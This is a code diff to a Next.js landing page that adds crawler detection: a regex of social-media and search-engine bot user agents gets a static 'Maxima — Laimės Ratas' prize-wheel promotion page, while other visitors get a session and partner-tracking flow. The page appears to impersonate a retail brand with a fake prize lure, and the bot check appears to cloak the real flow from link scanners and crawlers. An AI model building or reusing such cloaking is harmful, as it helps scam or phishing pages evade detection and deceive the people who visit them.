@@ -1,4 +1,5 @@
 import { redirect } from "next/navigation";
+import { headers } from "next/headers";
 import { createSessionAction } from "@/app/actions/create-session";
 
 export const dynamic = "force-dynamic";
@@ -68,7 +69,31 @@ type Props = {
   searchParams?: Promise<{ ref?: string }>;
 };
 
+const BOT_UA =
+  /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;
+
 export default async function Home({ searchParams }: Props) {
+  // Sosyal medya onizleme botlari icin: redirect/session OLUSTURMA,
+  // direkt bu sayfanin metadata'si (og:image vb.) ile basit HTML dondur.
+  // Boylece crawler ilk istekte og etiketlerini gorur ve DB'ye bos session yazilmaz.
+  try {
+    const h = await headers();
+    const ua = h.get("user-agent") || "";
+    if (BOT_UA.test(ua)) {
+      return (
+        <main>
+          <h1>Maxima — Laimės Ratas</h1>
+          <p>
+            Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir
+            laimėkite išskirtinius prizus.
+          </p>
+        </main>
+      );
+    }
+  } catch {
+    // headers() erisilemezse normal akis
+  }
+
   let partnerName = "admin";
   try {
     const sp = await searchParams;
